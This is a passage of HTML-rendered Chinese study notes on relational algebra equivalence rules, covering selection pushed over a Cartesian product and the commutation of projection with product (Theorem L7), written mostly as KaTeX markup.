vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></li><li>(3):若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo>=</mo><msub><mi>F</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F=F_1\wedge F_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">F_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>只涉及<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中属性，而<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>涉及<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中属性，则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><mi>E</mi><mn>1</mn><mo>×</mo><mi>E</mi><mn>2</mn><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><msub><mi>F</mi><mn>2</mn></msub></msub><mo stretchy="false">(</mo><msub><mi>σ</mi><msub><mi>F</mi><mn>1</mn></msub></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_F(E1\times E2)\equiv \sigma_{F_2}(\sigma_{F_1}(E_1)\times E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></li></ul><h5 id="%E5%AE%9A%E7%90%86l7%3A%E6%8A%95%E5%BD%B1%E5%92%8C%E7%A7%AF%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L7:投影和积的交换律</h5><p>设<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>为俩关系的代数表达式，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">A_1,...A_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是出现在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中的一些属性，其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">B_1,..B_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>出现在中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>，剩余的属性<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>C</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">C_1,..C_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>出现在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中，则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>π</mi><mrow><msub><mi>B</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>m</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>×</mo><msub><mi>π</mi><mrow><msub><mi>C</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>c</mi><mi>k</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi_{A_1..A_n}(E_1\times E_2)\equiv \pi_{B_1,..B_m}(E_1)\times \pi_{C_1,..c_k}(E_2))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0502em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.0502em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0715em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span 